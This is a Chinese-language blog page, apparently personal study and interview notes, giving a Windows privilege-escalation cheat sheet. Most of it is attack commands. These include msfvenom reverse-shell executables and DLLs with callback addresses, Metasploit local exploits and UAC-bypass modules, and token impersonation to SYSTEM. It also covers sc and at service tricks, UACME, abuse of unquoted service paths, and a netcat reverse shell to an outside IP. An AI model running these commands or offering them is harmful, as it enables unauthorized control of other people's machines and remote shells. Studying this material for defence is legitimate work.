@@ -1,0 +1,725 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="JUNYI">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="提权面试1234进入系统后，首先信息收集，查看当前用户名，网卡，补丁，系统信息，系统版本，然后通过获取的系统版本信息进行手工提权，如果是系统版本是2000，2003，xp就可以用at系统自带的命令提权，  windows 7、8、03、08、12、16可以用sc命令，  适用版本: win2012 &amp; win2008 &amp; Win2016全自动的提权，CS插件，MSF  权限提升12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升win">
+<meta property="og:url" content="http://example.com/2022/09/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87win/index.html">
+<meta property="og:site_name" content="俊毅网络安全">
+<meta property="og:description" content="提权面试1234进入系统后，首先信息收集，查看当前用户名，网卡，补丁，系统信息，系统版本，然后通过获取的系统版本信息进行手工提权，如果是系统版本是2000，2003，xp就可以用at系统自带的命令提权，  windows 7、8、03、08、12、16可以用sc命令，  适用版本: win2012 &amp; win2008 &amp; Win2016全自动的提权，CS插件，MSF  权限提升12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/1-16837861584191.png">
+<meta property="og:image" content="http://example.com/image/image-20230430175152218.png">
+<meta property="og:image" content="http://example.com/image/image-20230430205314368.png">
+<meta property="og:image" content="http://example.com/image/image-20230430210202509.png">
+<meta property="og:image" content="http://example.com/image/image-20230430210100392.png">
+<meta property="og:image" content="http://example.com/image/image-20230430212113038.png">
+<meta property="og:image" content="http://example.com/image/image-20230430211958854.png">
+<meta property="og:image" content="http://example.com/image/image-20230430212151767.png">
+<meta property="article:published_time" content="2022-09-14T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-14T04:46:30.418Z">
+<meta property="article:author" content="JUNYI">
+<meta property="article:tag" content="安全技术">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/image/1-16837861584191.png">
+  
+  
+  
+  <title>权限提升win - 俊毅网络安全</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>JunYi</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="权限提升win"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-09-14 12:00" pubdate>
+          2022年9月14日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">权限提升win</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="提权面试"><a href="#提权面试" class="headerlink" title="提权面试"></a>提权面试</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">进入系统后，首先信息收集，查看当前用户名，网卡，补丁，系统信息，系统版本，然后通过获取的系统版本信息进行手工提权，如果是系统版本是<span class="hljs-number">2000</span>，<span class="hljs-number">2003</span>，xp就可以用at系统自带的命令提权，<br>  windows <span class="hljs-number">7</span>、<span class="hljs-number">8</span>、<span class="hljs-number">03</span>、<span class="hljs-number">08</span>、<span class="hljs-number">12</span>、<span class="hljs-number">16</span>可以用sc命令，<br>  适用版本: win2012 &amp; win2008 &amp; Win2016<br>全自动的提权，CS插件，MSF<br></code></pre></td></tr></table></figure>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">win/linux/数据库<br><span class="hljs-comment">// 目的: 获取更高级的权限。---》 做更多高权限相关操作</span><br><br>提权路径<br>--》后台权限 --》系统权限<br>--》web权限  --》系统权限<br>--》数据库   --》系统权限<br>--》中间件   --》系统权限<br>  <br>win最高权限：system<br>linux最高权限：root<br></code></pre></td></tr></table></figure>
+
+<h4 id="常见权限获取方法"><a href="#常见权限获取方法" class="headerlink" title="常见权限获取方法"></a>常见权限获取方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">后台权限:SQL注入，数据库备份泄露，默认或弱口令等获取帐号密码进入<br>网站权限:后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达shell<br>数据库权限:SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入<br>接口权限:SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入<br>系统权限:高危系统漏洞直达或网站权限提升转入，数据库权限提升转入，第三方转入等<br>域控权限:高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等<br></code></pre></td></tr></table></figure>
+
+<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br><br>![微信截图_20230510160433](image/微信截图_20230510160433.png)<br><br>#### 基础信息获取<br><br>```php<br>当前权限             whoami /priv<br>操作系统版本《位数)   ver<br>漏洞补丁/杀软        systeminfo<br>网络连接状态         tasklist /svg      netstat -ano<br></code></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//github.com/k8gege/Ladon					     工具</span><br>https:<span class="hljs-comment">//github.com/Ascotbe/KernelHub			</span><br>https:<span class="hljs-comment">//github.com/nomi-sec/PoC-in-GitHub		</span><br>https:<span class="hljs-comment">//github.com/offensive-security/exploitdb	</span><br>http:<span class="hljs-comment">//cve.mitre.org/data/refs/refmap/source-MS.html</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="msf全自动提权"><a href="#msf全自动提权" class="headerlink" title="msf全自动提权"></a>msf全自动提权</h3><h4 id="查看session"><a href="#查看session" class="headerlink" title="查看session"></a>查看session</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="找系统安装的补丁"><a href="#找系统安装的补丁" class="headerlink" title="找系统安装的补丁"></a>找系统安装的补丁</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">background  <span class="hljs-comment">//放后台 看session的编号</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">post</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">gather</span>/<span class="hljs-title">enum_patches</span>    <br><span class="hljs-title">set</span> <span class="hljs-title">sessions</span> 32<br><span class="hljs-title">run</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="全自动命令"><a href="#全自动命令" class="headerlink" title="全自动命令"></a>全自动命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">background  <span class="hljs-comment">//放后台 看session的编号</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">post</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">recon</span>/<span class="hljs-title">local_exploit_suggester</span><br><span class="hljs-title">set</span> <span class="hljs-title">session</span> 32<br><span class="hljs-title">set</span> <span class="hljs-title">showdescription</span> <span class="hljs-title">true</span><br><span class="hljs-title">run</span><br>//找出有用的一个一个试试<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">ms16_075_reflection_juicy</span><br><span class="hljs-title">set</span> <span class="hljs-title">session</span> 32<br><span class="hljs-title">run</span>  // 即可成功提权<br></code></pre></td></tr></table></figure>
+
+<h3 id="CS提权"><a href="#CS提权" class="headerlink" title="CS提权"></a>CS提权</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">右键，插件有权限提升<br></code></pre></td></tr></table></figure>
+
+<h3 id="手工提权"><a href="#手工提权" class="headerlink" title="手工提权"></a>手工提权</h3><h3 id="WIN-AT命令提权"><a href="#WIN-AT命令提权" class="headerlink" title="WIN-&gt;AT命令提权"></a>WIN-&gt;AT命令提权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 系统自带命令</span><br>适合版本：<span class="hljs-comment">// Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除.</span><br>at <span class="hljs-number">14</span>:<span class="hljs-number">10</span> /interactive <span class="hljs-title function_ invoke__">cmd</span><br>(在<span class="hljs-number">14</span>:<span class="hljs-number">30</span>分生成一个交互式的System权限的cmd)<br></code></pre></td></tr></table></figure>
+
+<h3 id="WIN-SC命令"><a href="#WIN-SC命令" class="headerlink" title="WIN-&gt;SC命令"></a>WIN-&gt;SC命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 系统自带命令</span><br>windows <span class="hljs-number">7</span>、<span class="hljs-number">8</span>、<span class="hljs-number">03</span>、<span class="hljs-number">08</span>、<span class="hljs-number">12</span>、<span class="hljs-number">16</span><br><span class="hljs-comment">#创建一个名叫syscmd的新的交互式的cmd执行服务</span><br>sc Create syscmd binPath= <span class="hljs-string">&quot;cmd /K start&quot;</span> type= own type= interact<br>sc Create &lt;服务名称&gt;  binPath=<span class="hljs-string">&quot;cmd /K start&quot;</span>  type= own type= interact<br><br><span class="hljs-comment">#运行服务</span><br>sc start syscmd<br>sc start &lt;服务名称&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="WIN-PS命令提权"><a href="#WIN-PS命令提权" class="headerlink" title="WIN-&gt;PS命令提权"></a>WIN-&gt;PS命令提权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 手到下载上传</span><br><span class="hljs-number">1</span>.<span class="hljs-comment">// 适用版本: win2012 &amp; win2008 &amp; Win2016</span><br>https:<span class="hljs-comment">//docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br>运行：<br>psexec.exe -accepteula -s -i -d cmd <span class="hljs-comment">#调用运行cmd</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/1-16837861584191.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<h3 id="WIN-进程迁移"><a href="#WIN-进程迁移" class="headerlink" title="WIN-&gt;进程迁移"></a>WIN-&gt;进程迁移</h3><h5 id="pinjector-exe"><a href="#pinjector-exe" class="headerlink" title="pinjector.exe"></a>pinjector.exe</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">pinjector.exe工具<br>pinjector -l<br>pinjector -p <span class="hljs-number">436</span> cmd <span class="hljs-number">1111</span><br>nc <span class="hljs-number">43.138</span>.<span class="hljs-number">215.2</span> <span class="hljs-number">1111</span><br><br>Ps:nc -<span class="hljs-number">1</span> <span class="hljs-number">1111</span>监听端口<br></code></pre></td></tr></table></figure>
+
+<h5 id="msf进程迁移"><a href="#msf进程迁移" class="headerlink" title="msf进程迁移"></a>msf进程迁移</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.生成木马并运行<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe -o msf.exe<br>set Iport/Thost/payload<br>  <span class="hljs-comment">// payload =windows/meterpreter/reverse_tcp</span><br>run<br><br><span class="hljs-number">2</span>.权限迁移 <br>ps     <span class="hljs-comment">//查看进程</span><br>migrate PID       <span class="hljs-comment">//迁移对应PID</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="WIN-令牌窃取提权"><a href="#WIN-令牌窃取提权" class="headerlink" title="WIN-&gt;令牌窃取提权"></a>WIN-&gt;令牌窃取提权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">令牌窃取 Win2008 Win2012 阿里云服务器<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe -o msf.exe<br>set Iport/Thost/payload<br>wrun<br></code></pre></td></tr></table></figure>
+
+<h5 id="本地权限"><a href="#本地权限" class="headerlink" title="本地权限"></a>本地权限</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">meterpreter &gt;  <span class="hljs-keyword">use</span> <span class="hljs-title">incognito</span><br>// 直接在<span class="hljs-title">meterpreter</span>里运行，不用退出<br><span class="hljs-title">use</span> <span class="hljs-title">incognito</span><br><span class="hljs-title">list_tokens</span> -<span class="hljs-title">ux</span><br><span class="hljs-title">impersonate_token</span> &quot;<span class="hljs-title">NT</span> <span class="hljs-title">AUTHORITY</span>\<span class="hljs-title">SYSTEM</span>&quot;<br></code></pre></td></tr></table></figure>
+
+<h5 id="WEB权限"><a href="#WEB权限" class="headerlink" title="WEB权限"></a>WEB权限</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">上传potato.exe<br><br>execute -cH -f ./potato.exe <span class="hljs-comment">//配合烂士豆《原理: 利用MS16_075漏洞)</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">incognito</span><br><span class="hljs-title">list_tokens</span> -<span class="hljs-title">u</span><br><span class="hljs-title">impersonate_token</span> &quot;<span class="hljs-title">NT</span> <span class="hljs-title">AUTHORITY</span>\<span class="hljs-title">SYSTEM</span>&quot;<br></code></pre></td></tr></table></figure>
+
+<h3 id="WIN-getsytem提权"><a href="#WIN-getsytem提权" class="headerlink" title="WIN-&gt;getsytem提权"></a>WIN-&gt;getsytem提权</h3><h5 id="msf自动提权"><a href="#msf自动提权" class="headerlink" title="msf自动提权"></a>msf自动提权</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">handler</span><br><span class="hljs-title">set</span> <span class="hljs-title">PAYLOAD</span> <span class="hljs-title">windows</span>/<span class="hljs-title">meterpreter</span>/<span class="hljs-title">reverse_tcp</span><br><span class="hljs-title">set</span> <span class="hljs-title">lhost</span> 192.168.234.133<br><span class="hljs-title">set</span> <span class="hljs-title">lport</span> 3333<br><span class="hljs-title">run</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image-20230430175152218.png" srcset="/img/loading.gif" lazyload alt="image-20230430175152218"></p>
+<h3 id="UAC绕过"><a href="#UAC绕过" class="headerlink" title="UAC绕过"></a>UAC绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 介绍：</span><br><span class="hljs-comment">// uac一般指用户账户控制。 用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。</span><br><span class="hljs-comment">// msconfig &gt; 工具</span><br><span class="hljs-comment">// UAC有三个模式 低、中、高。开启任意模式，getsystem命令失效。因此需要绕过</span><br><br>使用msf搜索 UAC相关，可见到bypass模块<br>search UAC<br>-Test in win7 本地电脑 本地权限<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac</span><br>-<span class="hljs-title">Test</span> <span class="hljs-title">in</span> <span class="hljs-title">win10</span> 本地电脑 本地权限<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">ask</span>     (相当于钓鱼。用于高等级)<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac_sTuihijack</span><br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac_silentcleanup</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="UACME工具"><a href="#UACME工具" class="headerlink" title="UACME工具"></a>UACME工具</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//github.com/hfirefOx/UACME</span><br>执行以下命令上线<br>Akagi64.exe <span class="hljs-number">41</span> msf1.exe<br>Akagi64.exe &lt;编号&gt; &lt;调用执行&gt;<br><span class="hljs-number">23</span>/<span class="hljs-number">41</span>/<span class="hljs-number">61</span>常用编号<br><br>msf通过上面工具上线后。执行getsystem即可<br></code></pre></td></tr></table></figure>
+
+<h3 id="制作dll木马上传"><a href="#制作dll木马上传" class="headerlink" title="制作dll木马上传"></a>制作dll木马上传</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</span><br>msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> lport=<span class="hljs-number">4444</span> -f dll -o yeye.dll<br>  <br><span class="hljs-comment">// 等待触发</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ms17_<br></code></pre></td></tr></table></figure>
+
+<h3 id="Win-不带引号的服务"><a href="#Win-不带引号的服务" class="headerlink" title="Win-&gt;不带引号的服务"></a>Win-&gt;不带引号的服务</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</span><br><br><br>服务名称： 为 C:/AA X86/MM.EXE 没有双引号+路径中有空格   有则这是不安全的<br>可构造木马即路径为： C:/AA.exe	如此上面服务被调用的时候会调用到我们的木马程序<br></code></pre></td></tr></table></figure>
+
+<h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 方式一</span><br><span class="hljs-number">1</span>.msf上线+上传jaws-<span class="hljs-keyword">enum</span>.ps1文件<br><span class="hljs-number">2</span>.调用shell 中的 powershell <br><span class="hljs-number">3</span>.执行文件  .\jaws-<span class="hljs-keyword">enum</span>.ps1<br><br><span class="hljs-comment">// 方式二</span><br>检测命令：wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image-20230430205314368.png" srcset="/img/loading.gif" lazyload alt="image-20230430205314368"></p>
+<p>上图中  QiYouDaemon 可以被利用  &#x3D;&#x3D;》上传木马 D:&#x2F;Program.exe 即可</p>
+<p><img src="/image/image-20230430210202509.png" srcset="/img/loading.gif" lazyload alt="image-20230430210202509"></p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">主动调用（需要高权限）：<span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> <span class="hljs-string">&quot;QiYouDaemon&quot;</span><br><br>被动调用：等待被调用（电脑重启等等）<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image-20230430210100392.png" srcset="/img/loading.gif" lazyload alt="image-20230430210100392"></p>
